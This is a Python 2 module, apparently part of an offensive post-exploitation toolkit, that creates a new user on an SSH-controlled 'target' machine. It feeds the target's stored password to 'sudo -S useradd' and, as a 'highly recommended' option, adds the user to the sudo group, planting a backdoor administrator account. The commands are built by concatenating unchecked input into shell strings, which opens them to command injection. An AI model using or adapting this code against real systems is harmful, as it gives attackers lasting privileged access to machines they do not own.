from module import *
import os
import cmd
from colorama import *
from definitions import *

class UserAdd(Module):
    prompt = Fore.RED + "(userAdd) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using userAdd module"
        self.target = target
        self.core = core

    def check_valid(self):
        return True

    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
	user=raw_input("Input the new username.")
	password=raw_input("Input the new password.")
	
	print("Creating user....")

	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S useradd -p $(openssl passwd -1 \"" + password + "\") " + user)


	sud= (raw_input("Press y to make this user a superuser (highly recommended)")=='y')
	if(sud):
	    print "Adding user as superuser..."
	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S usermod -a -G sudo " + user)
	
	print(GOOD + "User %s created!" % user)
	
